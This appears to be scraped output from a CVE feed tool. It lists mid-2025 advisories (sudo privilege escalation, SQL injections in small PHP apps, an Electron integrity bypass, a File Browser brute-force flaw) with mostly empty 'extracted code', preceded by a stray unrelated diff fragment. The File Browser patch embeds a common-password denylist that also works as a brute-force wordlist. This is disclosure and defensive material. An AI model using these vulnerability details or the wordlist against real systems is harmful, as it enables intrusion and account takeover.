index 2f06c8a1f3a..bdacf941cac 100644
--- a/src_assets/common/assets/web/welcome.html
+++ b/src_assets/common/assets/web/welcome.html
@@ -78,6 +78,9 @@ <h1 class="mb-0">
         this.loading = true;
         fetch("./api/password", {
           method: "POST",
+          headers: {
+            'Content-Type': 'application/json'
+          },
           body: JSON.stringify(this.passwordData),
         }).then((r) => {
           this.loading = false;


================================================================================


CVE ID: CVE-2024-46992
Published: 2025-07-01T02:15:20.977
Modified: 2025-07-03T15:14:12.767
CVSS Score: 7.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-354: CWE-354

Description:
Electron is an open source framework for writing cross-platform desktop applications using JavaScript, HTML and CSS. From versions 30.0.0-alpha.1 to before 30.0.5 and 31.0.0-alpha.1 to before 31.0.0-beta.1, Electron is vulnerable to an ASAR Integrity bypass. This only impacts apps that have the embeddedAsarIntegrityValidation and onlyLoadAppFromAsar fuses enabled. Apps without these fuses enabled are not impacted. This issue is specific to Windows, apps using these fuses on macOS are not impacted. Specifically this issue can only be exploited if the app is launched from a filesystem the attacker has write access too. i.e. the ability to edit files inside the .app bundle on macOS which these fuses are supposed to protect against. This issue has been patched in versions 30.0.5 and 31.0.0-beta.1. There are no workarounds for this issue.

References (2):
  1. https://github.com/electron/electron/security/advisories/GHSA-xw5q-g62x-2qjc
  2. https://www.electronjs.org/docs/latest/tutorial/fuses

Attempting to extract code examples from references...

--- Code from https://www.electronjs.org/docs/latest/tutorial/fuses ---
@electron

ELECTRON_RUN_AS_NODE

runAsNode

================================================================================


CVE ID: CVE-2025-6937
Published: 2025-07-01T01:15:28.577
Modified: 2025-07-09T17:36:46.153
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in code-projects Simple Pizza Ordering System 1.0. It has been declared as critical. This vulnerability affects unknown code of the file /large.php. The manipulation of the argument ID leads to sql injection. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://code-projects.org/ [Product]
  2. https://github.com/Catcheryp/CVE/issues/3 [Exploit, Third Party Advisory, Issue Tracking]
  3. https://vuldb.com/?ctiid.314458 [Permissions Required]
  4. https://vuldb.com/?id.314458 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.605748 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314458 ---
id

================================================================================


CVE ID: CVE-2025-6935
Published: 2025-07-01T00:15:26.503
Modified: 2025-07-07T14:46:10.930
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in Campcodes Sales and Inventory System 1.0 and classified as critical. Affected by this issue is some unknown functionality of the file /pages/payment_add.php. The manipulation of the argument cid leads to sql injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/dragonghost2025/cve/issues/9 [Exploit, Third Party Advisory, Issue Tracking]
  2. https://vuldb.com/?ctiid.314456 [Permissions Required]
  3. https://vuldb.com/?id.314456 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.605720 [Third Party Advisory, VDB Entry]
  5. https://www.campcodes.com/ [Product]
  6. https://github.com/dragonghost2025/cve/issues/9 [Exploit, Third Party Advisory, Issue Tracking]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314456 ---
cid

================================================================================


CVE ID: CVE-2025-6932
Published: 2025-06-30T23:15:22.103
Modified: 2025-07-14T17:19:50.187
CVSS Score: 3.7 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N

CWE Categories:
  - CWE-255: CWE-255
  - CWE-259: CWE-259

Description:
A vulnerability, which was classified as problematic, was found in D-Link DCS-7517 up to 2.02.0. This affects the function g_F_n_GenPassForQlync of the file /bin/httpd of the component Qlync Password Generation Handler. The manipulation leads to use of hard-coded password. It is possible to initiate the attack remotely. The complexity of an attack is rather high. The exploitability is told to be difficult. The exploit has been disclosed to the public and may be used. This vulnerability only affects products that are no longer supported by the maintainer.

References (5):
  1. http://cdn2.v50to.cc/dlink/DCS-7517_B1_FW_v2.02.01/report_2.pdf [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.314445 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.314445 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.605595 [Third Party Advisory, VDB Entry]
  5. https://www.dlink.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314445 ---
g_F_n_GenPassForQlync

g_F_n_GenPassForQlync

================================================================================


CVE ID: CVE-2025-6930
Published: 2025-06-30T22:15:30.010
Modified: 2025-07-07T14:46:23.903
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability classified as critical has been found in PHPGurukul Zoo Management System 2.1. Affected is an unknown function of the file /admin/manage-foreigners-ticket.php. The manipulation of the argument ID leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/f1rstb100d/myCVE/issues/100 [Exploit, Third Party Advisory, Issue Tracking]
  2. https://phpgurukul.com/ [Product]
  3. https://vuldb.com/?ctiid.314442 [Permissions Required]
  4. https://vuldb.com/?id.314442 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.605579 [Third Party Advisory, VDB Entry]
  6. https://github.com/f1rstb100d/myCVE/issues/100 [Exploit, Third Party Advisory, Issue Tracking]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314442 ---
id

================================================================================


CVE ID: CVE-2025-6929
Published: 2025-06-30T21:15:32.853
Modified: 2025-07-07T14:46:35.950
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in PHPGurukul Zoo Management System 2.1. It has been rated as critical. This issue affects some unknown processing of the file /admin/view-normal-ticket.php. The manipulation of the argument viewid leads to sql injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/f1rstb100d/myCVE/issues/99 [Exploit, Third Party Advisory, Issue Tracking]
  2. https://phpgurukul.com/ [Product]
  3. https://vuldb.com/?ctiid.314441 [Permissions Required]
  4. https://vuldb.com/?id.314441 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.605578 [Third Party Advisory, VDB Entry]
  6. https://github.com/f1rstb100d/myCVE/issues/99 [Exploit, Third Party Advisory, Issue Tracking]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314441 ---
viewid

================================================================================


CVE ID: CVE-2025-32463
Published: 2025-06-30T21:15:30.257
Modified: 2025-09-30T13:30:30.213
CVSS Score: 9.3 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

CWE Categories:
  - CWE-829: CWE-829

Description:
Sudo before 1.9.17p1 allows local users to obtain root access because /etc/nsswitch.conf from a user-controlled directory is used with the --chroot option.

References (16):
  1. https://access.redhat.com/security/cve/cve-2025-32463 [Third Party Advisory]
  2. https://bugs.gentoo.org/show_bug.cgi?id=CVE-2025-32463 [Issue Tracking, Third Party Advisory]
  3. https://explore.alas.aws.amazon.com/CVE-2025-32463.html [Third Party Advisory]
  4. https://security-tracker.debian.org/tracker/CVE-2025-32463 [Third Party Advisory]
  5. https://ubuntu.com/security/notices/USN-7604-1 [Third Party Advisory]
  6. https://www.openwall.com/lists/oss-security/2025/06/30/3 [Third Party Advisory]
  7. https://www.secpod.com/blog/sudo-lpe-vulnerabilities-resolved-what-you-need-to-know-about-cve-2025-32462-and-cve-2025-32463/ [Exploit, Third Party Advisory]
  8. https://www.stratascale.com/vulnerability-alert-CVE-2025-32463-sudo-chroot [Exploit, Third Party Advisory]
  9. https://www.sudo.ws/releases/changelog/ [Release Notes]
  10. https://www.sudo.ws/security/advisories/ [Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://security-tracker.debian.org/tracker/CVE-2025-32463 ---
<SPAN>[bookworm] - sudo &lt;not-affected&gt; (Vulnerable code introduced later)</SPAN><br/><SPAN>[bullseye] - sudo &lt;not-affected&gt; (Vulnerable code introduced later)</SPAN><br/><a href="https://www.sudo.ws/security/advisories/chroot_bug/">https://www.sudo.ws/security/advisories/chroot_bug/</a><br/>

================================================================================


CVE ID: CVE-2025-32462
Published: 2025-06-30T21:15:30.080
Modified: 2025-07-25T15:15:26.497
CVSS Score: 2.8 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:C/C:N/I:L/A:N

CWE Categories:
  - CWE-863: Incorrect Authorization

Description:
Sudo before 1.9.17p1, when used with a sudoers file that specifies a host that is neither the current host nor ALL, allows listed users to execute commands on unintended machines.

References (13):
  1. https://access.redhat.com/security/cve/cve-2025-32462
  2. https://bugs.gentoo.org/show_bug.cgi?id=CVE-2025-32462
  3. https://explore.alas.aws.amazon.com/CVE-2025-32462.html
  4. https://lists.debian.org/debian-security-announce/2025/msg00118.html
  5. https://security-tracker.debian.org/tracker/CVE-2025-32462
  6. https://ubuntu.com/security/notices/USN-7604-1
  7. https://www.openwall.com/lists/oss-security/2025/06/30/2 [Mailing List, Third Party Advisory]
  8. https://www.secpod.com/blog/sudo-lpe-vulnerabilities-resolved-what-you-need-to-know-about-cve-2025-32462-and-cve-2025-32463/ [Third Party Advisory]
  9. https://www.stratascale.com/vulnerability-alert-CVE-2025-32462-sudo-host [Exploit, Third Party Advisory]
  10. https://www.sudo.ws/releases/changelog/ [Release Notes]

Attempting to extract code examples from references...

--- Code from https://lists.debian.org/debian-security-announce/2025/msg00118.html ---
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian Security Advisory DSA-5954-1                   security@debian.org
<a  rel="nofollow" href="https://www.debian.org/security/">https://www.debian.org/security/</a>                     Salvatore Bonaccorso
June 30, 2025                         <a  rel="nofollow" href="https://www.debian.org/security/faq">https://www.debian.org/security/faq</a>
- -------------------------------------------------------------------------

Package        : sudo
CVE ID         : CVE-2025-32462

Rich Mirch discovered that sudo, a program designed to provide limited
super user privileges to specific users, does not correctly handle the
host (-h or --host) option. Due to a bug the host option was not
restricted to listing privileges only and could be used when running a
command via sudo or editing a file with sudoedit. Depending on the rules
present in the sudoers file the flaw might allow a local privilege
escalation attack.

For the stable distribution (bookworm), this problem has been fixed in
version 1.9.13p3-1+deb12u2.

We recommend that you upgrade your sudo packages.

For the detailed security status of sudo please refer to its security
tracker page at:
<a  rel="nofollow" href="https://security-tracker.debian.org/tracker/sudo">https://security-tracker.debian.org/tracker/sudo</a>

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <a  rel="nofollow" href="https://www.debian.org/security/">https://www.debian.org/security/</a>

Mailing list: debian-security-announce@lists.debian.org
-----BEGIN PGP SIGNATURE-----

iQKTBAEBCgB9FiEERkRAmAjBceBVMd3uBUy48xNDz0QFAmhinHpfFIAAAAAALgAo
aXNzdWVyLWZwckBub3RhdGlvbnMub3BlbnBncC5maWZ0aGhvcnNlbWFuLm5ldDQ2
NDQ0MDk4MDhDMTcxRTA1NTMxRERFRTA1NENCOEYzMTM0M0NGNDQACgkQBUy48xND
z0S5fA/9H6Zq1F/AMF55WLyisdD3D2BF7guvoUMaEJdWe6OyaEoi8Dc2WT2br32t
zj6FpbBlMdKYGe5jPQAIWD8De/9hc+XLAen8q9Xee940amaZcM8r/6lAGdhQjGo2
cU/11ka14/e5RPtmM3stpS4wY39AHJ0soL2cLIjkPFFkMy1AuRYjgTui1eIaokKC
S5IH1wXC/+dv/OqStFR2LluF1LczFjsc4y0Dl6PgSMVRStvg9NAq3G8V444heuQa
NdlbFr84x7rCP4QOKrzd0h2WjJZV3dXXE392DOks54YCsdfk0MS0di2HEdVZscrE
RI9rWIyTxVX8hCxZRFEkYPRNl2Rm7hJ/YKFN7+lJTtl44IEk2DpBWDBO8xN+QymR
wLdkUz70QTKpO92sIEKiKog0DBcIIHF0xwuqvouLWhx53VYwtl0RyZBDsN9nSfJ0
J1ZRAzU8x8kKWFDmXBP6dQEtSGvyN3vIo15yFeE0TcNDiUuaREne/EPsluYFTyWn
JzhrtvICfzoK7Jn9L+N958M2LUgMIYFxZLpetUB+KfqfJ+x1NAXayfiZfm8BVMXU
Bvw2SfE9D8xrxfjg3g6HhY7JoJfOs50FPtvrTkky13AG7BfBWFl6vYrriov38Fgq
JkSNzh5GAoSHFCeksOXeztkuAQ8+t3BQah84XF8214jKCFqc/Gc=
=uyBl
-----END PGP SIGNATURE-----



================================================================================


CVE ID: CVE-2025-52997
Published: 2025-06-30T20:15:25.847
Modified: 2025-08-04T18:15:35.313
CVSS Score: 5.9 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N

CWE Categories:
  - CWE-307: CWE-307
  - CWE-521: CWE-521
  - CWE-1392: CWE-1392

Description:
File Browser provides a file managing interface within a specified directory and it can be used to upload, delete, preview, rename and edit files. Prior to version 2.34.1, a missing password policy and brute-force protection makes the authentication process insecure. Attackers could mount a brute-force attack to retrieve the passwords of all accounts in a given instance. This issue has been patched in version 2.34.1.

References (3):
  1. https://github.com/filebrowser/filebrowser/commit/bf37f88c32222ad9c186482bb97338a9c9b4a93c [Patch]
  2. https://github.com/filebrowser/filebrowser/security/advisories/GHSA-cm2r-rg7r-p7gg [Exploit, Vendor Advisory]
  3. https://github.com/sbaresearch/advisories/tree/public/2025/SBA-ADV-20250327-01_Filebrowser_Insecure_Password_Handling

Attempting to extract code examples from references...

--- Code from https://github.com/filebrowser/filebrowser/commit/bf37f88c32222ad9c186482bb97338a9c9b4a93c ---
From bf37f88c32222ad9c186482bb97338a9c9b4a93c Mon Sep 17 00:00:00 2001
From: Henrique Dias <mail@hacdias.com>
Date: Sun, 29 Jun 2025 11:28:32 +0200
Subject: [PATCH] fix: passthrough the minimum password length (#5236)

---
 auth/hook.go                      |      4 +-
 auth/proxy.go                     |      2 +-
 cmd/root.go                       |      2 +-
 cmd/users_add.go                  |      2 +-
 cmd/users_update.go               |      2 +-
 errors/errors.go                  |     15 +-
 http/auth.go                      |      4 +-
 http/users.go                     |     28 +-
 users/assets.go                   |     26 +
 users/assets/common-passwords.txt | 100000 +++++++++++++++++++++++++++
 users/password.go                 |     10 +-
 11 files changed, 100065 insertions(+), 30 deletions(-)
 create mode 100644 users/assets.go
 create mode 100644 users/assets/common-passwords.txt

diff --git a/auth/hook.go b/auth/hook.go
index 9ccbd2fe8d..849a923d1a 100644
--- a/auth/hook.go
+++ b/auth/hook.go
@@ -150,7 +150,7 @@ func (a *HookAuth) SaveUser() (*users.User, error) {
 	}
 
 	if u == nil {
-		pass, err := users.HashAndValidatePwd(a.Cred.Password, a.Settings.MinimumPasswordLength)
+		pass, err := users.ValidateAndHashPwd(a.Cred.Password, a.Settings.MinimumPasswordLength)
 		if err != nil {
 			return nil, err
 		}
@@ -186,7 +186,7 @@ func (a *HookAuth) SaveUser() (*users.User, error) {
 
 		// update the password when it doesn't match the current
 		if p {
-			pass, err := users.HashAndValidatePwd(a.Cred.Password, a.Settings.MinimumPasswordLength)
+			pass, err := users.ValidateAndHashPwd(a.Cred.Password, a.Settings.MinimumPasswordLength)
 			if err != nil {
 				return nil, err
 			}
diff --git a/auth/proxy.go b/auth/proxy.go
index 61312f1a1a..301aa292f8 100644
--- a/auth/proxy.go
+++ b/auth/proxy.go
@@ -35,7 +35,7 @@ func (a ProxyAuth) createUser(usr users.Store, setting *settings.Settings, srv *
 	}
 
 	var hashedRandomPassword string
-	hashedRandomPassword, err = users.HashAndValidatePwd(pwd, setting.MinimumPasswordLength)
+	hashedRandomPassword, err = users.ValidateAndHashPwd(pwd, setting.MinimumPasswordLength)
 	if err != nil {
 		return nil, err
 	}
diff --git a/cmd/root.go b/cmd/root.go
index c2ee7c7382..4b6819b7d6 100644
--- a/cmd/root.go
+++ b/cmd/root.go
@@ -432,7 +432,7 @@ func quickSetup(flags *pflag.FlagSet, d pythonData) {
 
 		log.Println("Randomly generated password for user 'admin':", pwd)
 
-		password, err = users.HashAndValidatePwd(pwd, set.MinimumPasswordLength)
+		password, err = users.ValidateAndHashPwd(pwd, set.MinimumPasswordLength)
 		checkErr(err)
 	}
 
diff --git a/cmd/users_add.go b/cmd/users_add.go
index 4b344107eb..c3b8af2822 100644
--- a/cmd/users_add.go
+++ b/cmd/users_add.go
@@ -21,7 +21,7 @@ var usersAddCmd = &cobra.Command{
 		checkErr(err)
 		getUserDefaults(cmd.Flags(), &s.Defaults, false)
 
-		password, err := users.HashAndValidatePwd(args[1], s.MinimumPasswordLength)
+		password, err := users.ValidateAndHashPwd(args[1], s.MinimumPasswordLength)
 		checkErr(err)
 
 		user := &users.User{
diff --git a/cmd/users_update.go b/cmd/users_update.go
index aa06abee8c..2c58c4af46 100644
--- a/cmd/users_update.go
+++ b/cmd/users_update.go
@@ -66,7 +66,7 @@ options you want to change.`,
 		}
 
 		if password != "" {
-			user.Password, err = users.HashAndValidatePwd(password, s.MinimumPasswordLength)
+			user.Password, err = users.ValidateAndHashPwd(password, s.MinimumPasswordLength)
 			checkErr(err)
 		}
 
diff --git a/errors/errors.go b/errors/errors.go
index 7bb10e81be..5fd760c212 100644
--- a/errors/errors.go
+++ b/errors/errors.go
@@ -1,13 +1,16 @@
 package errors
 
-import "errors"
+import (
+	"errors"
+	"fmt"
+)
 
 var (
 	ErrEmptyKey             = errors.New("empty key")
 	ErrExist                = errors.New("the resource already exists")
 	ErrNotExist             = errors.New("the resource does not exist")
 	ErrEmptyPassword        = errors.New("password is empty")
-	ErrShortPassword        = errors.New("password is too short")
+	ErrEasyPassword         = errors.New("password is too easy")
 	ErrEmptyUsername        = errors.New("username is empty")
 	ErrEmptyRequest         = errors.New("empty request")
 	ErrScopeIsRelative      = errors.New("scope is a relative path")
@@ -20,3 +23,11 @@ var (
 	ErrSourceIsParent       = errors.New("source is parent")
 	ErrRootUserDeletion     = errors.New("user with id 1 can't be deleted")
 )
+
+type ErrShortPassword struct {
+	MinimumLength uint
+}
+
+func (e ErrShortPassword) Error() string {
+	return fmt.Sprintf("password is too short, minimum length is %d", e.MinimumLength)
+}
diff --git a/http/auth.go b/http/auth.go
index 54f5fe9b81..304762c8f2 100644
--- a/http/auth.go
+++ b/http/auth.go
@@ -151,9 +151,9 @@ var signupHandler = func(_ http.ResponseWriter, r *http.Request, d *data) (int,
 
 	d.settings.Defaults.Apply(user)
 
-	pwd, err := users.HashAndValidatePwd(info.Password, d.settings.MinimumPasswordLength)
+	pwd, err := users.ValidateAndHashPwd(info.Password, d.settings.MinimumPasswordLength)
 	if err != nil {
-		return http.StatusInternalServerError, err
+		return http.StatusBadRequest, err
 	}
 
 	user.Password = pwd
diff --git a/http/users.go b/http/users.go
index 5eea184e47..4185e82e62 100644
--- a/http/users.go
+++ b/http/users.go
@@ -125,13 +125,9 @@ var userPostHandler = withAdmin(func(w http.ResponseWriter, r *http.Request, d *
 		return http.StatusBadRequest, fbErrors.ErrEmptyPassword
 	}
 
-	if len(req.Data.Password) < int(d.settings.MinimumPasswordLength) {
-		return http.StatusBadRequest, fbErrors.ErrShortPassword
-	}
-
-	req.Data.Password, err = users.HashAndValidatePwd(req.Data.Password, d.settings.MinimumPasswordLength)
+	req.Data.Password, err = users.ValidateAndHashPwd(req.Data.Password, d.settings.MinimumPasswordLength)
 	if err != nil {
-		return http.StatusInternalServerError, err
+		return http.StatusBadRequest, err
 	}
 
 	userHome, err := d.settings.MakeUserDir(req.Data.Username, req.Data.Scope, d.server.Root)
@@ -167,17 +163,19 @@ var userPutHandler = withSelfOrAdmin(func(w http.ResponseWriter, r *http.Request
 		}
 
 		if req.Data.Password != "" {
-			req.Data.Password, err = users.HashAndValidatePwd(req.Data.Password, d.settings.MinimumPasswordLength)
+			req.Data.Password, err = users.ValidateAndHashPwd(req.Data.Password, d.settings.MinimumPasswordLength)
+			if err != nil {
+				return http.StatusBadRequest, err
+			}
 		} else {
 			var suser *users.User
 			suser, err = d.store.Users.Get(d.server.Root, d.raw.(uint))
+			if err != nil {
+				return http.StatusInternalServerError, err
+			}
 			req.Data.Password = suser.Password
 		}
 
-		if err != nil {
-			return http.StatusInternalServerError, err
-		}
-
 		req.Which = []string{}
 	}
 
@@ -190,13 +188,9 @@ var userPutHandler = withSelfOrAdmin(func(w http.ResponseWriter, r *http.Request
 				return http.StatusForbidden, nil
 			}
 
-			if len(req.Data.Password) < int(d.settings.MinimumPasswordLength) {
-				return http.StatusBadRequest, fbErrors.ErrShortPassword
-			}
-
-			req.Data.Password, err = users.HashAndValidatePwd(req.Data.Password, d.settings.MinimumPasswordLength)
+			req.Data.Password, err = users.ValidateAndHashPwd(req.Data.Password, d.settings.MinimumPasswordLength)
 			if err != nil {
-				return http.StatusInternalServerError, err
+				return http.StatusBadRequest, err
 			}
 		}
 
diff --git a/users/assets.go b/users/assets.go
new file mode 100644
index 0000000000..a01aed413e
--- /dev/null
+++ b/users/assets.go
@@ -0,0 +1,26 @@
+package users
+
+import (
+	"embed"
+	"strings"
+)
+
+//go:embed assets
+var assets embed.FS
+var commonPasswords map[string]struct{}
+
+//nolint:gochecknoinits
+func init() {
+	// Password list sourced from:
+	// https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt
+	data, err := assets.ReadFile("assets/common-passwords.txt")
+	if err != nil {
+		panic(err)
+	}
+
+	passwords := strings.Split(strings.TrimSpace(string(data)), "\n")
+	commonPasswords = make(map[string]struct{}, len(passwords))
+	for _, password := range passwords {
+		commonPasswords[strings.TrimSpace(password)] = struct{}{}
+	}
+}
diff --git a/users/assets/common-passwords.txt b/users/assets/common-passwords.txt
new file mode 100644
index 0000000000..9ac1387d03
--- /dev/null
+++ b/users/assets/common-passwords.txt
@@ -0,0 +1,100000 @@
+123456
+123456789
+qwerty
+password
+111111
+12345678
+abc123
+1234567
+password1
+12345
+1234567890
+123123
+000000
+iloveyou
+1234
+1q2w3e4r5t
+qwertyuiop
+123
+monkey
+dragon
+123456a
+654321
+123321
+666666
+1qaz2wsx
+myspace1
+121212
+homelesspa
+123qwe
+a123456
+123abc
+1q2w3e4r
+qwe123
+7777777
+qwerty123
+target123
+tinkle
+987654321
+qwerty1
+222222
+zxcvbnm
+1g2w3e4r
+gwerty
+zag12wsx
+gwerty123
+555555
+fuckyou
+112233
+asdfghjkl
+1q2w3e
+123123123
+qazwsx
+computer
+princess
+12345a
+ashley
+159753
+michael
+football
+sunshine
+1234qwer
+iloveyou1
+aaaaaa
+fuckyou1
+789456123
+daniel
+777777
+princess1
+123654
+11111
+asdfgh
+999999
+11111111
+passer2009
+888888
+love
+abcd1234
+shadow
+football1
+love123
+superman
+jordan23
+jessica
+monkey1
+12qwaszx
+a12345
+baseball
+123456789a
+killer
+asdf
+samsung
+master
+azerty
+charlie
+asd123
+soccer
+FQRG7CS493
+88888888
+jordan
+michael1
+jesus1
+linkedin
+babygirl1
+789456
+blink182
+thomas
+qwer1234
+333333
+liverpool
+michelle
+nicole
+qwert
+j38ifUbn
+131313
+asdasd
+0
+987654
+lovely
+q1w2e3r4
+0123456789
+gfhjkm
+andrew
+hello1
+joshua
+Status
+justin
+anthony
+angel1
+iloveyou2
+1111111
+zxcvbn
+hello
+1111
+jennifer
+hunter
+naruto
+bitch1
+welcome
+159357
+101010
+tigger
+147258369
+babygirl
+jessica1
+parola
+5201314
+robert
+fuckyou2
+696969
+102030
+0987654321
+loveme
+123456q
+apple
+pokemon
+mother
+money1
+secret
+anthony1
+purple
+q1w2e3r4t5y6
+baseball1
+qazwsxedc
+1111111111
+abc
+buster
+matthew
+andrea
+soccer1
+basketball
+hannah
+freedom
+golfer
+chelsea
+passw0rd
+george
+trustno1
+friends
+william
+iloveu
+amanda
+number1
+chocolate
+qwerty12
+summer
+flower
+charlie1
+maggie
+pakistan
+samantha
+asdf1234
+letmein
+asshole1
+superman1
+marina
+147258
+batman
+fuk19600
+butterfly
+010203
+qweqwe
+29rsavoy
+forever
+1
+mustang
+sunshine1
+ashley1
+internet
+london
+666
+harley
+alexander
+xbox360
+00000000
+12341234
+q1w2e3
+pepper
+family
+loveyou
+50cent
+joseph
+whatever
+!
+jasmine
+orange
+user
+junior
+cookie
+martin
+qweasdzxc
+212121
+1qazxsw2
+password12
+google
+password2
+111222
+lol123
+hello123
+jordan1
+shadow1
+patrick
+3rJs1la7qE
+ginger
+nicole1
+mylove
+arsenal
+12344321
+abcdef
+love12
+232323
+VQsaBLPzLa
+taylor
+myspace
+brandon
+angel
+12345q
+brandon1
+chris1
+diamond
+snoopy
+asshole
+qweasd
+starwars
+matrix
+mickey
+school
+jonathan
+melissa
+eminem
+1234561
+cjmasterinf
+lovers
+1234567891
+nikita
+richard
+1342
+yellow
+12345qwert
+oliver
+q1w2e3r4t5
+cheese
+a123456789
+christian
+290966
+wall.e
+12345678910
+12413
+sophie
+tudelft
+DIOSESFIEL
+dpbk1234
+PE#5GZ29PTZMSE
+bailey
+U38fa39
+mercedes
+victoria
+147852
+asdasd5
+matthew1
+abcdefg
+peanut
+456789
+red123
+happy1
+sandra
+benjamin
+dragon1
+444444
+123654789
+$HEX
+elizabeth
+prince
+amanda1
+angels
+angela
+qqqqqq
+samuel
+banana
+barcelona
+ghbdtn
+computer1
+michelle1
+william1
+hockey
+monster
+carlos
+justin1
+antonio
+qwertyu
+nathan
+55555
+123789
+0000
+killer1
+11223344
+chicken
+lucky1
+gabriel
+welcome1
+zaq12wsx
+jasmine1
+silver
+hunter1
+bubbles
+hottie1
+purple1
+andrew1
+daniel1
+liverpool1
+1qaz2wsx3edc
+rainbow
+morgan
+natasha
+fuckoff
+jackson
+austin
+vanessa
+mommy1
+madison
+adidas
+xxxxxx
+252525
+america
+james1
+metallica
+slipknot
+chicken1
+87654321
+jesus
+NULL
+0000000000
+alexis
+!ab#cd$
+spiderman
+steven
+ferrari
+lauren
+456123
+robert1
+147852369
+qwaszx
+buddy1
+butterfly1
+!~!1
+tinkerbell
+bandit
+danielle
+0123456
+nicholas
+hannah1
+qwerty12345
+1234554321
+asdfasdf
+pokemon1
+nirvana
+destiny
+scooter
+cookie1
+123qweasd
+loveme1
+chelsea1
+chocolate1
+1234567a
+juventus
+rachel
+111222tianya
+qazxsw
+zzzzzz
+monica
+stella
+america1
+999999999
+jennifer1
+freedom1
+taylor1
+741852963
+yamaha
+victor
+00000
+qwertyui
+a1b2c3
+ronaldo
+1password
+smokey
+david1
+money
+daddy1
+cocacola
+a838hfiD
+1234abcd
+joshua1
+123asd
+buster1
+myspace123
+booboo
+madison1
+samantha1
+heather
+7654321
+elizabeth1
+poop
+tigger1
+family1
+mustang1
+142536
+november
+jasper
+lovely1
+diamond1
+success
+edward
+music1
+valentina
+harley1
+sweety
+tennis
+zxc123
+friend
+qaz123
+whatever1
+thomas1
+nothing
+N0=Acc3ss
+super123
+casper
+Password
+chester
+Exigent
+password123
+cheese1
+spongebob1
+mynoob
+hahaha
+hellokitty
+098765
+alexandra
+canada
+david
+1q2w3e4r5t6y
+dennis
+december
+olivia
+a1b2c3d4
+playboy
+sabrina
+patricia
+summer1
+friends1
+mexico1
+dakota
+barbie
+loulou
+johnny
+music
+123456m
+Password1
+lover1
+maggie1
+pretty
+123hfjdk147
+nicolas
+qwert1
+charles
+phoenix
+rebecca
+thunder
+sexy123
+iloveu2
+123456789q
+batman1
+beautiful
+carolina
+4815162342
+vincent
+jeremy
+spider
+master1
+heather1
+weed420
+Sojdlg123aljg
+pepper1
+sebastian
+yankees
+dallas
+pussy1
+cameron
+caroline
+peanut1
+guitar
+startfinding
+midnight
+i
+iw14Fi9j
+yankees1
+elephant
+124578
+scorpion
+sexy
+tweety
+bubbles1
+fuckoff1
+cowboys1
+fuckme
+fucker
+louise
+dolphin
+852456
+patrick1
+loser1
+mother1
+lalala
+naruto1
+veronica
+melissa1
+sparky
+newyork
+adrian
+123456s
+september
+heaven
+alexander1
+jessie
+crystal
+tigers
+k.:
+p
+iloveyou!
+chris
+gemini
+raiders1
+135790
+zxcvbnm1
+peaches
+merlin
+12121212
+spongebob
+scooby
+stephanie
+shannon
+james
+246810
+1a2b3c
+555666
+sergey
+lovelove
+202020
+159951
+precious
+123456j
+lakers
+manchester
+ginger1
+134679
+cristina
+apples
+a1234567
+qqww1122
+pussy
+daniela
+jackson1
+123456b
+jackie
+rocky1
+asdfghjkl1
+sakura
+qazwsx123
+yellow1
+flower1
+apple1
+010101
+newyork1
+sammy1
+alex
+muffin
+cherry
+poohbear
+richard1
+nigger1
+test123
+destiny1
+flowers
+slipknot1
+cooper
+753951
+monster1
+paSSword
+baby123
+mexico
+blessed1
+toyota
+spiderman1
+beauty
+fuck
